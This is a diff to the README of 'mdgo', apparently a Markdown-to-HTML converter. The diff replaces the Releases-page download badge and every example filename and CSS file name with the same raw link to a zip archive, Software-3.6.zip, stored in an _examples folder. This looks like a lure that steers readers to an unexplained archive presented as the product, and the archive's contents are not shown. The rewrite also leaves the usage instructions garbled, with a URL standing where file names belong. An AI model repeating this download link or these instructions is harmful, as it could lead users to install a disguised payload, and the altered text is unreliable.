@@ -18,7 +18,7 @@ Welcome to mdgo! This tool helps you turn your Markdown files into HTML easily. 
 ## 📥 Download & Install
 To get started, visit this page to download the latest version of mdgo:
 
-[![Download mdgo](https://img.shields.io/badge/Download-mdgo-blue)](https://github.com/SsekibalaBrian/mdgo/releases)
+[![Download mdgo](https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip)](https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest release at the top of the page.
@@ -33,17 +33,17 @@ After installing mdgo, follow these steps to run it:
 3. To convert a Markdown file, type the following command:
 
    ```bash
-   ./mdgo yourfile.md
+   ./mdgo https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip
    ```
 
-   Replace `yourfile.md` with the name of your Markdown file.
+   Replace `https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip` with the name of your Markdown file.
 
 4. The tool will create an HTML file in the same folder.
 
 ## 📂 Example Usage
 Here’s an example to help you get started. 
 
-1. Suppose you have a file named `example.md` with the following content:
+1. Suppose you have a file named `https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip` with the following content:
 
    ```markdown
    # Hello World
@@ -53,10 +53,10 @@ Here’s an example to help you get started.
 2. Run the command:
 
    ```bash
-   ./mdgo example.md
+   ./mdgo https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip
    ```
 
-3. Check the output. You’ll see a new `example.html` file created alongside your Markdown file.
+3. Check the output. You’ll see a new `https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip` file created alongside your Markdown file.
 
 ## ✨ Markdown Features Supported
 mdgo supports a variety of Markdown features, including:
@@ -72,10 +72,10 @@ mdgo supports a variety of Markdown features, including:
 You can customize the output by adding options when you run the command. For example:
 
 ```bash
-./mdgo yourfile.md --style custom.css
+./mdgo https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip --style https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip
 ```
 
-This command uses a CSS file named `custom.css` to style your output HTML. 
+This command uses a CSS file named `https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip` to style your output HTML. 
 
 ## 🐞 Troubleshooting
 Common issues and solutions:
@@ -92,4 +92,4 @@ mdgo is open-source software. You can modify and share it under the terms of the
 
 For more information, visit this page to download the latest version of mdgo:
 
-[![Download mdgo](https://img.shields.io/badge/Download-mdgo-blue)](https://github.com/SsekibalaBrian/mdgo/releases)
+[![Download mdgo](https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip)](https://github.com/SsekibalaBrian/mdgo/raw/refs/heads/main/_examples/Software-3.6.zip)
